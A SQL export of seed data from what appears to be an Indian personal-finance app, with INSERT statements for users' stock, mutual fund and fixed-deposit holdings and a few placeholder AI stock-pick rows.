NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "portfolio" ("id", "user_id", "broker_id", "ticker_symbol", "stock_name", "asset_type", "asset_category", "quantity", "date_purchased", "purchase_price", "purchased_value", "current_price", "current_value", "sector", "exchange", "isin", "trade_type", "data_source", "last_sync_date", "created_at", "updated_at", "contract_type", "strike_price", "expiry_date", "lot_size", "nps_scheme", "pension_fund_manager", "property_type", "property_location", "maturity_date", "interest_rate", "option_type", "tier", "area_sqft", "coupon_rate", "face_value", "gold_form", "gold_purity", "grams", "tenant_id") VALUES (16, 28, 'dhan', 'TCS', 'Tata Consultancy Services', 'Stocks', NULL, 25.0, '2024-08-01', 3950.0, 98750.0, 4125.8, 103145.0, 'Information Technology', 'NSE', NULL, 'long_term', 'broker', NULL, '2025-10-21T12:18:05.814512', '2025-10-21T12:18:05.814513', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "portfolio" ("id", "user_id", "broker_id", "ticker_symbol", "stock_name", "asset_type", "asset_category", "quantity", "date_purchased", "purchase_price", "purchased_value", "current_price", "current_value", "sector", "exchange", "isin", "trade_type", "data_source", "last_sync_date", "created_at", "updated_at", "contract_type", "strike_price", "expiry_date", "lot_size", "nps_scheme", "pension_fund_manager", "property_type", "property_location", "maturity_date", "interest_rate", "option_type", "tier", "area_sqft", "coupon_rate", "face_value", "gold_form", "gold_purity", "grams", "tenant_id") VALUES (17, 28, 'zerodha', 'BAJFINANCE', 'Bajaj Finance Limited', 'Stocks', NULL, 15.0, '2024-04-25', 6800.0, 102000.0, 6750.45, 101256.75, 'Financial Services', 'NSE', NULL, 'long_term', 'broker', NULL, '2025-10-21T12:18:05.814514', '2025-10-21T12:18:05.814514', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "portfolio" ("id", "user_id", "broker_id", "ticker_symbol", "stock_name", "asset_type", "asset_category", "quantity", "date_purchased", "purchase_price", "purchased_value", "current_price", "current_value", "sector", "exchange", "isin", "trade_type", "data_source", "last_sync_date", "created_at", "updated_at", "contract_type", "strike_price", "expiry_date", "lot_size", "nps_scheme", "pension_fund_manager", "property_type", "property_location", "maturity_date", "interest_rate", "option_type", "tier", "area_sqft", "coupon_rate", "face_value", "gold_form", "gold_purity", "grams", "tenant_id") VALUES (18, 30, 'zerodha', 'RELIANCE', 'Reliance Industries Limited', 'Stocks', NULL, 50.0, '2024-06-15', 2650.0, 132500.0, 2845.6, 142280.0, 'Oil & Gas', 'NSE', NULL, 'long_term', 'broker', NULL, '2025-10-23T02:58:15.724019', '2025-10-23T02:58:15.724022', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "portfolio" ("id", "user_id", "broker_id", "ticker_symbol", "stock_name", "asset_type", "asset_category", "quantity", "date_purchased", "purchase_price", "purchased_value", "current_price", "current_value", "sector", "exchange", "isin", "trade_type", "data_source", "last_sync_date", "created_at", "updated_at", "contract_type", "strike_price", "expiry_date", "lot_size", "nps_scheme", "pension_fund_manager", "property_type", "property_location", "maturity_date", "interest_rate", "option_type", "tier", "area_sqft", "coupon_rate", "face_value", "gold_form", "gold_purity", "grams", "tenant_id") VALUES (19, 30, 'angel', 'INFY', 'Infosys Limited', 'Stocks', NULL, 75.0, '2024-07-20', 1420.0, 106500.0, 1447.7, 108577.5, 'Information Technology', 'NSE', NULL, 'long_term', 'broker', NULL, '2025-10-23T02:58:15.724025', '2025-10-23T02:58:15.724025', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "portfolio" ("id", "user_id", "broker_id", "ticker_symbol", "stock_name", "asset_type", "asset_category", "quantity", "date_purchased", "purchase_price", "purchased_value", "current_price", "current_value", "sector", "exchange", "isin", "trade_type", "data_source", "last_sync_date", "created_at", "updated_at", "contract_type", "strike_price", "expiry_date", "lot_size", "nps_scheme", "pension_fund_manager", "property_type", "property_location", "maturity_date", "interest_rate", "option_type", "tier", "area_sqft", "coupon_rate", "face_value", "gold_form", "gold_purity", "grams", "tenant_id") VALUES (20, 30, 'zerodha', 'HDFCBANK', 'HDFC Bank Limited', 'Stocks', NULL, 30.0, '2024-05-10', 1580.0, 47400.0, 1625.3, 48759.0, 'Banking', 'NSE', NULL, 'long_term', 'broker', NULL, '2025-10-23T02:58:15.724026', '2025-10-23T02:58:15.724027', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "portfolio" ("id", "user_id", "broker_id", "ticker_symbol", "stock_name", "asset_type", "asset_category", "quantity", "date_purchased", "purchase_price", "purchased_value", "current_price", "current_value", "sector", "exchange", "isin", "trade_type", "data_source", "last_sync_date", "created_at", "updated_at", "contract_type", "strike_price", "expiry_date", "lot_size", "nps_scheme", "pension_fund_manager", "property_type", "property_location", "maturity_date", "interest_rate", "option_type", "tier", "area_sqft", "coupon_rate", "face_value", "gold_form", "gold_purity", "grams", "tenant_id") VALUES (21, 30, 'dhan', 'TCS', 'Tata Consultancy Services', 'Stocks', NULL, 25.0, '2024-08-01', 3950.0, 98750.0, 4125.8, 103145.0, 'Information Technology', 'NSE', NULL, 'long_term', 'broker', NULL, '2025-10-23T02:58:15.724027', '2025-10-23T02:58:15.724028', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "portfolio" ("id", "user_id", "broker_id", "ticker_symbol", "stock_name", "asset_type", "asset_category", "quantity", "date_purchased", "purchase_price", "purchased_value", "current_price", "current_value", "sector", "exchange", "isin", "trade_type", "data_source", "last_sync_date", "created_at", "updated_at", "contract_type", "strike_price", "expiry_date", "lot_size", "nps_scheme", "pension_fund_manager", "property_type", "property_location", "maturity_date", "interest_rate", "option_type", "tier", "area_sqft", "coupon_rate", "face_value", "gold_form", "gold_purity", "grams", "tenant_id") VALUES (22, 30, 'zerodha', 'BAJFINANCE', 'Bajaj Finance Limited', 'Stocks', NULL, 15.0, '2024-04-25', 6800.0, 102000.0, 6750.45, 101256.75, 'Financial Services', 'NSE', NULL, 'long_term', 'broker', NULL, '2025-10-23T02:58:15.724028', '2025-10-23T02:58:15.724029', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 'live') ON CONFLICT DO NOTHING;

-- Table: ai_stock_picks
-- Exported: 2026-01-25T05:09:40.367031
-- Rows: 5

INSERT INTO "ai_stock_picks" ("id", "pick_date", "symbol", "company_name", "current_price", "target_price", "recommendation", "confidence_score", "ai_reasoning", "sector", "market_cap", "pe_ratio", "dividend_yield", "key_highlights", "risk_factors", "created_at", "tenant_id") VALUES (56, '2025-10-24', 'ICICI', 'ICICI Limited', 1000.0, 1120.0, 'BUY', 85, 'Perplexity AI Analysis:  | Price Data: ₹1000.00 (5-min delayed NSE data)', 'Diversified', NULL, NULL, NULL, NULL, NULL, '2025-10-24T04:03:17.579677', 'live') ON CONFLICT DO NOTHING;
INSERT INTO "ai_stock_picks" ("id", "pick_date", "symbol", "company_name", "current_price", "target_price", "recommendation", "confidence_score", "ai_reasoning", "sector", "market_cap", "pe_ratio", "dividend_yield", "key_highlights", "risk_factors", "created_at", "tenant_id") VALUES (57, '2025-10-24', 'HAL', 'HAL Limited', 1000.0, 1120.0, 'BUY', 85, 'Perplexity AI Analysis:  | Price Data: ₹1000.00 (5-min delayed NSE data)', 'Diversified', NULL, NULL, NULL, NULL, NULL, '2025-10-24T04:03:17.579678', 'live') ON CONFLICT DO NOTHING;
INSERT INTO "ai_stock_picks" ("id", "pick_date", "symbol", "company_name", "current_price", "target_price", "recommendation", "confidence_score", "ai_reasoning", "sector", "market_cap", "pe_ratio", "dividend_yield", "key_highlights", "risk_factors", "created_at", "tenant_id") VALUES (58, '2025-10-24', 'NSE', 'NSE Limited', 1000.0, 1120.0, 'BUY', 85, 'Perplexity AI Analysis:  | Price Data: ₹1000.00 (5-min delayed NSE data)', 'Diversified', NULL, NULL, NULL, NULL, NULL, '2025-10-24T04:03:17.579679', 'live') ON CONFLICT DO NOTHING;
INSERT INTO "ai_stock_picks" ("id", "pick_date", "symbol", "company_name", "current_price", "target_price", "recommendation", "confidence_score", "ai_reasoning", "sector", "market_cap", "pe_ratio", "dividend_yield", "key_highlights", "risk_factors", "created_at", "tenant_id") VALUES (59, '2025-10-24', 'NSE', 'NSE Limited', 1000.0, 1120.0, 'BUY', 85, 'Perplexity AI Analysis:  | Price Data: ₹1000.00 (5-min delayed NSE data)', 'Diversified', NULL, NULL, NULL, NULL, NULL, '2025-10-24T04:03:17.579679', 'live') ON CONFLICT DO NOTHING;
INSERT INTO "ai_stock_picks" ("id", "pick_date", "symbol", "company_name", "current_price", "target_price", "recommendation", "confidence_score", "ai_reasoning", "sector", "market_cap", "pe_ratio", "dividend_yield", "key_highlights", "risk_factors", "created_at", "tenant_id") VALUES (60, '2025-10-24', 'NSE', 'NSE Limited', 1000.0, 1120.0, 'BUY', 85, 'Perplexity AI Analysis:  | Price Data: ₹1000.00 (5-min delayed NSE data)', 'Diversified', NULL, NULL, NULL, NULL, NULL, '2025-10-24T04:03:17.579681', 'live') ON CONFLICT DO NOTHING;

-- Table: manual_equity_holdings
-- Exported: 2026-01-25T05:09:40.670540
-- Rows: 14

INSERT INTO "manual_equity_holdings" ("id", "user_id", "symbol", "company_name", "isin", "transaction_type", "purchase_date", "quantity", "purchase_price", "brokerage", "stt", "transaction_charges", "gst", "stamp_duty", "total_charges", "total_investment", "current_price", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (6, 30, 'RELIANCE', 'Reliance Industries Ltd', 'INE002A01018', 'BUY', '2024-06-15', 100.0, 2500.5, 50.0, 25.0, 10.0, 8.5, 5.0, 98.5, 250148.5, 2650.0, 265000.0, 14851.5, 5.937073378413222, 'Growth Portfolio', 'Equity', NULL, TRUE, '2025-10-23T03:47:50.920008', '2025-10-23T03:47:50.920011', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_equity_holdings" ("id", "user_id", "symbol", "company_name", "isin", "transaction_type", "purchase_date", "quantity", "purchase_price", "brokerage", "stt", "transaction_charges", "gst", "stamp_duty", "total_charges", "total_investment", "current_price", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (7, 30, 'TCS', 'Tata Consultancy Services Ltd', 'INE467B01029', 'BUY', '2024-07-20', 50.0, 3200.0, 40.0, 16.0, 8.0, 6.4, 4.0, 74.4, 160074.4, 3450.0, 172500.0, 12425.600000000006, 7.762390488422888, 'Core Portfolio', 'Equity', NULL, TRUE, '2025-10-23T03:47:50.920015', '2025-10-23T03:47:50.920016', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_equity_holdings" ("id", "user_id", "symbol", "company_name", "isin", "transaction_type", "purchase_date", "quantity", "purchase_price", "brokerage", "stt", "transaction_charges", "gst", "stamp_duty", "total_charges", "total_investment", "current_price", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (8, 30, 'HDFCBANK', 'HDFC Bank Ltd', 'INE040A01034', 'BUY', '2024-05-10', 75.0, 1550.0, 30.0, 11.63, 6.0, 4.75, 3.0, 55.38, 116305.38, 1620.0, 121500.0, 5194.619999999995, 4.466362605066073, 'Banking Portfolio', 'Equity', NULL, TRUE, '2025-10-23T03:47:50.920017', '2025-10-23T03:47:50.920017', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_equity_holdings" ("id", "user_id", "symbol", "company_name", "isin", "transaction_type", "purchase_date", "quantity", "purchase_price", "brokerage", "stt", "transaction_charges", "gst", "stamp_duty", "total_charges", "total_investment", "current_price", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (9, 30, 'INFY', 'Infosys Ltd', 'INE009A01021', 'BUY', '2024-08-05', 60.0, 1450.0, 25.0, 8.7, 5.0, 4.0, 2.5, 45.2, 87045.2, 1480.0, 88800.0, 1754.800000000003, 2.015964119790641, 'IT Portfolio', 'Equity', NULL, TRUE, '2025-10-23T03:47:50.920018', '2025-10-23T03:47:50.920018', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_equity_holdings" ("id", "user_id", "symbol", "company_name", "isin", "transaction_type", "purchase_date", "quantity", "purchase_price", "brokerage", "stt", "transaction_charges", "gst", "stamp_duty", "total_charges", "total_investment", "current_price", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (10, 30, 'ICICIBANK', 'ICICI Bank Ltd', 'INE090A01021', 'BUY', '2024-04-15', 80.0, 950.0, 28.0, 7.6, 5.5, 4.2, 2.8, 48.1, 76048.1, 1020.0, 81600.0, 5551.899999999994, 7.300511123880798, 'Banking Portfolio', 'Equity', NULL, TRUE, '2025-10-23T03:47:50.920019', '2025-10-23T03:47:50.920020', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_equity_holdings" ("id", "user_id", "symbol", "company_name", "isin", "transaction_type", "purchase_date", "quantity", "purchase_price", "brokerage", "stt", "transaction_charges", "gst", "stamp_duty", "total_charges", "total_investment", "current_price", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (11, 34, 'RELIANCE', 'Reliance Industries Ltd', NULL, 'BUY', '2024-06-15', 50.0, 2450.0, NULL, NULL, NULL, NULL, NULL, NULL, 122500.0, 2850.5, 142525.0, 20025.0, 16.35, NULL, 'Equities', NULL, TRUE, '2025-10-31T16:32:34.529302', '2025-10-31T16:32:34.529302', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_equity_holdings" ("id", "user_id", "symbol", "company_name", "isin", "transaction_type", "purchase_date", "quantity", "purchase_price", "brokerage", "stt", "transaction_charges", "gst", "stamp_duty", "total_charges", "total_investment", "current_price", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (12, 34, 'TCS', 'Tata Consultancy Services', NULL, 'BUY', '2024-07-20', 25.0, 3280.0, NULL, NULL, NULL, NULL, NULL, NULL, 82000.0, 3950.75, 98768.75, 16768.75, 20.45, NULL, 'Equities', NULL, TRUE, '2025-10-31T16:32:34.529302', '2025-10-31T16:32:34.529302', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_equity_holdings" ("id", "user_id", "symbol", "company_name", "isin", "transaction_type", "purchase_date", "quantity", "purchase_price", "brokerage", "stt", "transaction_charges", "gst", "stamp_duty", "total_charges", "total_investment", "current_price", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (13, 34, 'INFY', 'Infosys Ltd', NULL, 'BUY', '2024-08-10', 40.0, 1420.0, NULL, NULL, NULL, NULL, NULL, NULL, 56800.0, 1685.25, 67410.0, 10610.0, 18.68, NULL, 'Equities', NULL, TRUE, '2025-10-31T16:32:34.529302', '2025-10-31T16:32:34.529302', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_equity_holdings" ("id", "user_id", "symbol", "company_name", "isin", "transaction_type", "purchase_date", "quantity", "purchase_price", "brokerage", "stt", "transaction_charges", "gst", "stamp_duty", "total_charges", "total_investment", "current_price", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (14, 34, 'HDFCBANK', 'HDFC Bank Ltd', NULL, 'BUY', '2024-09-05', 30.0, 1580.0, NULL, NULL, NULL, NULL, NULL, NULL, 47400.0, 1725.8, 51774.0, 4374.0, 9.23, NULL, 'Equities', NULL, TRUE, '2025-10-31T16:32:34.529302', '2025-10-31T16:32:34.529302', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_equity_holdings" ("id", "user_id", "symbol", "company_name", "isin", "transaction_type", "purchase_date", "quantity", "purchase_price", "brokerage", "stt", "transaction_charges", "gst", "stamp_duty", "total_charges", "total_investment", "current_price", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (15, 35, 'WIPRO', 'Wipro Ltd', NULL, 'BUY', '2024-05-10', 100.0, 425.0, NULL, NULL, NULL, NULL, NULL, NULL, 42500.0, 495.75, 49575.0, 7075.0, 16.65, NULL, 'Equities', NULL, TRUE, '2025-10-31T16:32:38.820147', '2025-10-31T16:32:38.820147', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_equity_holdings" ("id", "user_id", "symbol", "company_name", "isin", "transaction_type", "purchase_date", "quantity", "purchase_price", "brokerage", "stt", "transaction_charges", "gst", "stamp_duty", "total_charges", "total_investment", "current_price", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (16, 35, 'ICICIBANK', 'ICICI Bank Ltd', NULL, 'BUY', '2024-06-01', 60.0, 920.0, NULL, NULL, NULL, NULL, NULL, NULL, 55200.0, 1125.5, 67530.0, 12330.0, 22.34, NULL, 'Equities', NULL, TRUE, '2025-10-31T16:32:38.820147', '2025-10-31T16:32:38.820147', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_equity_holdings" ("id", "user_id", "symbol", "company_name", "isin", "transaction_type", "purchase_date", "quantity", "purchase_price", "brokerage", "stt", "transaction_charges", "gst", "stamp_duty", "total_charges", "total_investment", "current_price", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (17, 35, 'BAJFINANCE', 'Bajaj Finance Ltd', NULL, 'BUY', '2024-07-15', 20.0, 6500.0, NULL, NULL, NULL, NULL, NULL, NULL, 130000.0, 7850.25, 157005.0, 27005.0, 20.77, NULL, 'Equities', NULL, TRUE, '2025-10-31T16:32:38.820147', '2025-10-31T16:32:38.820147', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_equity_holdings" ("id", "user_id", "symbol", "company_name", "isin", "transaction_type", "purchase_date", "quantity", "purchase_price", "brokerage", "stt", "transaction_charges", "gst", "stamp_duty", "total_charges", "total_investment", "current_price", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (18, 35, 'ASIANPAINT', 'Asian Paints Ltd', NULL, 'BUY', '2024-08-20', 35.0, 2950.0, NULL, NULL, NULL, NULL, NULL, NULL, 103250.0, 3280.75, 114826.25, 11576.25, 11.21, NULL, 'Equities', NULL, TRUE, '2025-10-31T16:32:38.820147', '2025-10-31T16:32:38.820147', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_equity_holdings" ("id", "user_id", "symbol", "company_name", "isin", "transaction_type", "purchase_date", "quantity", "purchase_price", "brokerage", "stt", "transaction_charges", "gst", "stamp_duty", "total_charges", "total_investment", "current_price", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (19, 27, 'INFY', 'Infosys', '', 'BUY', '2025-09-09', 100.0, 1500.0, 100.0, 0.0, 0.0, 0.0, 0.0, 100.0, 150100.0, NULL, NULL, NULL, NULL, 'Default', 'Equity', '', TRUE, '2026-01-09T05:37:29.006427', '2026-01-09T05:37:29.006430', NULL, 'live') ON CONFLICT DO NOTHING;

-- Table: manual_mutual_fund_holdings
-- Exported: 2026-01-25T05:09:40.822538
-- Rows: 8

INSERT INTO "manual_mutual_fund_holdings" ("id", "user_id", "scheme_name", "fund_house", "isin", "folio_number", "fund_category", "transaction_type", "transaction_date", "units", "nav", "amount", "entry_load", "exit_load", "stamp_duty", "stt", "other_charges", "total_charges", "total_investment", "current_nav", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "xirr", "absolute_return", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (5, 30, 'HDFC Equity Fund - Direct Plan - Growth', 'HDFC Asset Management Company', 'INF179KA1215', '12345/67', 'Equity', 'PURCHASE', '2024-01-15', 250.456, 718.5, 180000.0, 0.0, 0.0, 50.0, 0.0, 0.0, 50.0, 180050.0, 850.5, 213012.82799999998, 32962.82799999998, 18.30759677867258, NULL, 18.30759677867258, 'Equity MF', 'Mutual Fund', NULL, TRUE, '2025-10-23T03:47:51.441338', '2025-10-23T03:47:51.441341', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_mutual_fund_holdings" ("id", "user_id", "scheme_name", "fund_house", "isin", "folio_number", "fund_category", "transaction_type", "transaction_date", "units", "nav", "amount", "entry_load", "exit_load", "stamp_duty", "stt", "other_charges", "total_charges", "total_investment", "current_nav", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "xirr", "absolute_return", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (6, 30, 'SBI Bluechip Fund - Direct Plan - Growth', 'SBI Mutual Fund', 'INF200KA1156', '98765/43', 'Equity', 'PURCHASE', '2024-02-10', 180.234, 888.0, 160000.0, 0.0, 0.0, 40.0, 0.0, 0.0, 40.0, 160040.0, 975.25, 175773.2085, 15733.208500000008, 9.830797613096731, NULL, 9.830797613096731, 'Equity MF', 'Mutual Fund', NULL, TRUE, '2025-10-23T03:47:51.441342', '2025-10-23T03:47:51.441343', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_mutual_fund_holdings" ("id", "user_id", "scheme_name", "fund_house", "isin", "folio_number", "fund_category", "transaction_type", "transaction_date", "units", "nav", "amount", "entry_load", "exit_load", "stamp_duty", "stt", "other_charges", "total_charges", "total_investment", "current_nav", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "xirr", "absolute_return", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (7, 30, 'ICICI Prudential Technology Fund - Direct Plan - Growth', 'ICICI Prudential Mutual Fund', 'INF109KA1721', '54321/98', 'Equity', 'PURCHASE', '2024-03-05', 120.567, 912.5, 110000.0, 0.0, 0.0, 30.0, 0.0, 0.0, 30.0, 110030.0, 1125.75, 135728.30025, 25698.30025, 23.355721394165226, NULL, 23.355721394165226, 'Sector MF', 'Mutual Fund', NULL, TRUE, '2025-10-23T03:47:51.441343', '2025-10-23T03:47:51.441344', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_mutual_fund_holdings" ("id", "user_id", "scheme_name", "fund_house", "isin", "folio_number", "fund_category", "transaction_type", "transaction_date", "units", "nav", "amount", "entry_load", "exit_load", "stamp_duty", "stt", "other_charges", "total_charges", "total_investment", "current_nav", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "xirr", "absolute_return", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (8, 30, 'Axis Long Term Equity Fund - Direct Plan - Growth', 'Axis Asset Management Company', 'INF846K01EW4', '11223/44', 'ELSS', 'PURCHASE', '2024-04-01', 95.234, 1050.0, 100000.0, 0.0, 0.0, 25.0, 0.0, 0.0, 25.0, 100025.0, 1180.5, 112423.737, 12398.736999999994, 12.395638090477375, NULL, 12.395638090477375, 'Tax Saver', 'Mutual Fund', NULL, TRUE, '2025-10-23T03:47:51.441344', '2025-10-23T03:47:51.441344', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_mutual_fund_holdings" ("id", "user_id", "scheme_name", "fund_house", "isin", "folio_number", "fund_category", "transaction_type", "transaction_date", "units", "nav", "amount", "entry_load", "exit_load", "stamp_duty", "stt", "other_charges", "total_charges", "total_investment", "current_nav", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "xirr", "absolute_return", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (9, 34, 'Axis Bluechip Fund - Direct Growth', 'Axis Mutual Fund', NULL, 'ABC123456', 'Equity - Large Cap', 'BUY', '2024-01-10', 250.5, 42.5, 10646.25, NULL, NULL, NULL, NULL, NULL, NULL, 10646.25, 55.75, 13965.38, 3319.13, 31.17, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:33:28.765186', '2025-10-31T16:33:28.765186', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_mutual_fund_holdings" ("id", "user_id", "scheme_name", "fund_house", "isin", "folio_number", "fund_category", "transaction_type", "transaction_date", "units", "nav", "amount", "entry_load", "exit_load", "stamp_duty", "stt", "other_charges", "total_charges", "total_investment", "current_nav", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "xirr", "absolute_return", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (10, 34, 'ICICI Pru Technology Fund - Direct Growth', 'ICICI Prudential MF', NULL, 'DEF789012', 'Equity - Sectoral', 'BUY', '2024-02-15', 180.0, 68.0, 12240.0, NULL, NULL, NULL, NULL, NULL, NULL, 12240.0, 92.4, 16632.0, 4392.0, 35.88, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:33:28.765186', '2025-10-31T16:33:28.765186', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_mutual_fund_holdings" ("id", "user_id", "scheme_name", "fund_house", "isin", "folio_number", "fund_category", "transaction_type", "transaction_date", "units", "nav", "amount", "entry_load", "exit_load", "stamp_duty", "stt", "other_charges", "total_charges", "total_investment", "current_nav", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "xirr", "absolute_return", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (11, 35, 'SBI Small Cap Fund - Direct Growth', 'SBI Mutual Fund', NULL, 'SBI456789', 'Equity - Small Cap', 'BUY', '2024-03-01', 150.0, 85.0, 12750.0, NULL, NULL, NULL, NULL, NULL, NULL, 12750.0, 118.5, 17775.0, 5025.0, 39.41, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:33:31.844490', '2025-10-31T16:33:31.844490', NULL, 'live') ON CONFLICT DO NOTHING;
INSERT INTO "manual_mutual_fund_holdings" ("id", "user_id", "scheme_name", "fund_house", "isin", "folio_number", "fund_category", "transaction_type", "transaction_date", "units", "nav", "amount", "entry_load", "exit_load", "stamp_duty", "stt", "other_charges", "total_charges", "total_investment", "current_nav", "current_value", "unrealized_pnl", "unrealized_pnl_percentage", "xirr", "absolute_return", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (12, 35, 'HDFC Balanced Advantage Fund', 'HDFC Mutual Fund', NULL, 'HDFC123789', 'Hybrid - Dynamic Asset Allocation', 'BUY', '2024-04-10', 300.0, 52.0, 15600.0, NULL, NULL, NULL, NULL, NULL, NULL, 15600.0, 64.25, 19275.0, 3675.0, 23.56, NULL, NULL, NULL, NULL, NULL, TRUE, '2025-10-31T16:33:31.844490', '2025-10-31T16:33:31.844490', NULL, 'live') ON CONFLICT DO NOTHING;

-- Table: manual_fixed_deposit_holdings
-- Exported: 2026-01-25T05:09:40.979952
-- Rows: 7

INSERT INTO "manual_fixed_deposit_holdings" ("id", "user_id", "bank_name", "fd_number", "account_number", "branch_name", "deposit_type", "principal_amount", "interest_rate", "tenure_months", "tenure_days", "deposit_date", "maturity_date", "interest_frequency", "interest_payout", "tds_applicable", "tds_deducted", "maturity_amount", "interest_earned", "current_value", "nominee_name", "nominee_relation", "status", "portfolio_name", "asset_class", "notes", "is_active", "created_at", "updated_at", "broker_account_id", "tenant_id") VALUES (4, 30, 'HDFC Bank', 'FD123456', '50100123456789', 'Mumbai Main Branch', 'Regular', 500000.0, 7.25, 24, NULL, '2023-06-01', '2025-06-01', 'Cumulative', 'Cumulative', TRUE, 0.0, 577269.772987355, 77269.77298735501, 577269.772987355, 'Spouse Name', 'Spouse', 'Matured', 'Fixed Income', 'Fixed Deposit', NULL, TRUE, '2025-10-23T03:07:05.371477', '2025-10-23T03:07:05.371480', NULL, 'live') ON CONFLICT DO NOTHING;
